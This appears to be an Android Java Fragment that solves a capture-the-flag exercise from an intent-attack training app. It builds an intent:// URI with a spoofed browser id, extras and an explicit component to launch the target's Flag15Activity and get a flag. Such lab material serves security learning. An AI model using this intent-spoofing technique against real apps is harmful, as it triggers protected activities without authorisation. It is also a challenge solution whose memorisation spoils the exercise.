package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import java.net.URISyntaxException;

public class Flag15Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag15, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag15);
        launchButton.setOnClickListener(v -> {
            Intent intent = null;
            try {
                intent = Intent.parseUri("intent://flag15/#Intent;" +
                                "action=io.hextree.action.GIVE_FLAG;" +
                                "category=android.intent.category.BROWSABLE;" +
                                "S.com.android.browser.application_id=com.android.chrome;" +
                                "S.action=flag;" +
                                "B.flag=true;" +
                                "component=io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag15Activity;" +
                                "end",
                        0);
            } catch (URISyntaxException e) {
                throw new RuntimeException(e);
            }
            startActivity(intent);
        });
        return view;
    }
}
